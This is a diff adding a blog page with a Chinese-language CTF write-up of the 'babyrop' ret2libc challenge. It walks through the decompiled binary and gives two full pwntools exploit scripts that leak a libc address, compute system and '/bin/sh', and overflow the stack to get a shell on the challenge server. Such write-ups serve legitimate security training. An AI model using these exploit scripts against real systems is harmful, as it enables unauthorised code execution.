@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="babyrop  ret2libchecksec查看，只开启了栈执行保护，是32位的，使用ida查看字符串，没有看到’&#x2F;bin&#x2F;sh’，排除ROPgadget构造System(‘&#x2F;bin&#x2F;sh’)，查看反编译的代码如下：  12345678910111213141516171819202122232425262728293031323334353637383">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2lib">
+<meta property="og:url" content="http://example.com/babyrop/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="babyrop  ret2libchecksec查看，只开启了栈执行保护，是32位的，使用ida查看字符串，没有看到’&#x2F;bin&#x2F;sh’，排除ROPgadget构造System(‘&#x2F;bin&#x2F;sh’)，查看反编译的代码如下：  12345678910111213141516171819202122232425262728293031323334353637383">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/babyrop/babyrop(1).png">
+<meta property="og:image" content="http://example.com/babyrop/babyrop(2).png">
+<meta property="article:published_time" content="2021-09-15T09:45:32.000Z">
+<meta property="article:modified_time" content="2022-07-19T01:20:16.119Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ret2libc">
+<meta property="article:tag" content="32bit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/babyrop/babyrop(1).png">
+
+<link rel="canonical" href="http://example.com/babyrop/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ret2lib | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/babyrop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2lib
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-09-15 17:45:32" itemprop="dateCreated datePublished" datetime="2021-09-15T17:45:32+08:00">2021-09-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:20:16" itemprop="dateModified" datetime="2022-07-19T09:20:16+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="babyrop-ret2lib"><a href="#babyrop-ret2lib" class="headerlink" title="babyrop  ret2lib"></a>babyrop  ret2lib</h1><p>checksec查看，只开启了栈执行保护，是32位的，使用ida查看字符串，没有看到’&#x2F;bin&#x2F;sh’，排除ROPgadget构造System(‘&#x2F;bin&#x2F;sh’)，查看反编译的代码如下：</p>
+<p><img src="/babyrop/babyrop(1).png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> random; <span class="comment">// [esp+4h] [ebp-14h] BYREF    32位系统下为4个字节，这里对应esp的4个位置，栈的长度4个字节</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);   <span class="comment">//随机数</span></span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">​    read(fd, &amp;random, <span class="number">4u</span>);    <span class="comment">//写入4字节的随机数到buf中</span></span><br><span class="line"></span><br><span class="line">  v2 = function1(random);    <span class="comment">//输入的数值作为参数传递给function1</span></span><br><span class="line">  function2(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">function1</span><span class="params">(<span class="type">int</span> random)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//void *memset(void *str, int c, size_t n) 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));     <span class="comment">//m字符填充，将整个字符数组都填充为0</span></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, random);     <span class="comment">//int sprintf(char *str, const char *format, ...) 发送格式化输出到 str 所指向的字符串。</span></span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);   <span class="comment">//读取键盘的输入，不存在溢出点，read返回值为实际读取到的字节数</span></span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;    <span class="comment">//把 buf 最末一个字符去掉为0，v5为该字符数组的长度</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);   <span class="comment">//以\x00为结尾判断</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )    <span class="comment">//要使得buf和s的前v1个字符相同，如果v1为0则一定相同</span></span><br><span class="line">​    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);     <span class="comment">//输出到屏幕</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];  <span class="comment">//取字符数组下标为7的ASCII码，即十六进制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">function2</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">​    result = read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">​    result = read(<span class="number">0</span>, buf, a1);     <span class="comment">//这里取的是字符的ASCII码值，控制a1大于231，那样就可以溢出，覆盖ret地址，通过获取lib版本来getshell</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行代码审计，可以得出，我们需要先绕过function1，使得strlen(buf)的返回值为0，然后进入function2，让buf的第八个字符尽可能的大，让read的可溢出范围大大一些。</p>
+<p>计算溢出值，从char buf[231] 右边的ebp-e7h可以知道，这个变量距离ebp有0xe7的空间，需要填充0xe7个</p>
+<p>function2函数调用的时候push了一个ebp，因此在溢出的时候需要溢出多4个字节，把ebp覆盖掉。</p>
+<p><img src="/babyrop/babyrop(2).png"></p>
+<p>构造payload1，使用puts来暴露地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;local:1/remote:2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select==<span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26949</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> select==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">​    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">LSM_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">\<span class="comment">#_start_addr = elf.symbols[&#x27;_start&#x27;] Not all the file has the function of _start</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x8048825</span>   <span class="comment">#Get it by IDA or gdb</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;begin send the payload2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(LSM_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">LSM_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;LSM_addr: &#x27;</span> + <span class="built_in">hex</span>(LSM_addr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;*******&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,LSM_addr)</span><br><span class="line"></span><br><span class="line">basic_addr = LSM_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = basic_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">str_binsh_addr = basic_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(system_addr) + <span class="string">&#x27;temp&#x27;</span> + p32(str_binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload2 使用write来暴露地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26949</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#溢出控制返回值v5</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#泄漏libc</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">\<span class="comment">#计算libc_base，system_addr，bin_sh_addr</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#执行payload</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ret2libc/" rel="tag"># ret2libc</a>
+              <a href="/tags/32bit/" rel="tag"># 32bit</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/pwn2_sctf_2016/" rel="prev" title="pwn2_sctf_2016">
+      <i class="fa fa-chevron-left"></i> pwn2_sctf_2016
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ciscn_2019_ne_5/" rel="next" title="ciscn_2019_ne_5">
+      ciscn_2019_ne_5 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#babyrop-ret2lib"><span class="nav-number">1.</span> <span class="nav-text">babyrop  ret2lib</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
